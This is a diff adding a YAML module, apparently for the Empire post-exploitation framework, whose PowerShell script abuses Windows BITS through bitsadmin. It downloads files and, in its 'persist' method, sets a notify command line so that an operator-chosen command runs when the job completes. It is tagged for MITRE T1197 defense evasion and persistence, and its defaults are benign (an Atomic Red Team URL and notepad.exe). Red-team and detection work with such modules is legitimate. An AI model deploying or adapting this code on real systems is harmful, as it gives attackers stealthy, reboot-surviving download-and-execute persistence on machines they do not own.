@@ -1,0 +1,107 @@
+name: Invoke-BitsTransfer
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Uses Background Intelligent Transfer Service (BITS) jobs to
+  download files and optionally set up notification command execution
+  for persistence. BITS is a legitimate Windows service used for
+  asynchronous file transfers. Adversaries abuse BITS jobs because
+  they can survive reboots, are less conspicuous than other download
+  methods, and can trigger command execution upon completion.
+software: ''
+tactics: [TA0005, TA0003]
+techniques: [T1197]
+background: true
+output_extension:
+needs_admin: false
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+options:
+  - name: RemoteUrl
+    description: URL of the file to download.
+    required: true
+    value: 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md'
+  - name: LocalPath
+    description: Local path to save the downloaded file.
+    required: true
+    value: '$env:TEMP\bits_download.txt'
+  - name: JobName
+    description: Name for the BITS job.
+    required: false
+    value: 'EmpireBITS'
+  - name: Method
+    description: >-
+      BITS method (download for simple transfer, persist for notification command
+      execution).
+    required: true
+    value: 'download'
+    suggested_values:
+      - download
+      - persist
+  - name: NotifyCommand
+    description: Command to execute when BITS job completes (persist method only).
+    required: false
+    depends_on:
+      - name: Method
+        values: ['persist']
+    value: 'C:\Windows\system32\notepad.exe'
+  - name: OutputFunction
+    description: PowerShell output function to use.
+    required: false
+    value: 'Out-String'
+    suggested_values:
+      - Out-String
+      - ConvertTo-Json
+script: |
+  function Invoke-BitsTransfer {
+      param(
+          [string]$RemoteUrl,
+          [string]$LocalPath,
+          [string]$JobName = "EmpireBITS",
+          [string]$Method = "download",
+          [string]$NotifyCommand
+      )
+
+      $localFile = $ExecutionContext.InvokeCommand.ExpandString($LocalPath)
+
+      switch ($Method.ToLower()) {
+          "download" {
+              Write-Output "[*] Starting BITS download..."
+              Write-Output "[*] URL: $RemoteUrl"
+              Write-Output "[*] Local: $localFile"
+              try {
+                  $result = bitsadmin.exe /transfer /Download /priority Foreground $RemoteUrl $localFile 2>&1
+                  Write-Output $result
+                  if (Test-Path $localFile) {
+                      Write-Output "[+] Download complete: $localFile"
+                  } else {
+                      Write-Output "[-] Download may have failed."
+                  }
+              } catch {
+                  Write-Output "[-] BITS transfer failed: $_"
+              }
+          }
+          "persist" {
+              Write-Output "[*] Creating persistent BITS job: $JobName"
+              bitsadmin.exe /create $JobName 2>&1 | Out-Null
+              bitsadmin.exe /addfile $JobName $RemoteUrl $localFile 2>&1 | Out-Null
+              bitsadmin.exe /setnotifycmdline $JobName $NotifyCommand NULL 2>&1 | Out-Null
+              bitsadmin.exe /resume $JobName 2>&1 | Out-Null
+              Write-Output "[+] BITS job created and resumed."
+              Write-Output "[+] Notify command: $NotifyCommand"
+              Write-Output "[+] Job will execute command on completion."
+              Start-Sleep -Seconds 5
+              bitsadmin.exe /complete $JobName 2>&1 | Out-Null
+              Write-Output "[+] BITS job completed."
+          }
+          default {
+              Write-Output "[-] Invalid method: $Method. Use download or persist."
+          }
+      }
+  }
+script_end: Invoke-BitsTransfer {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
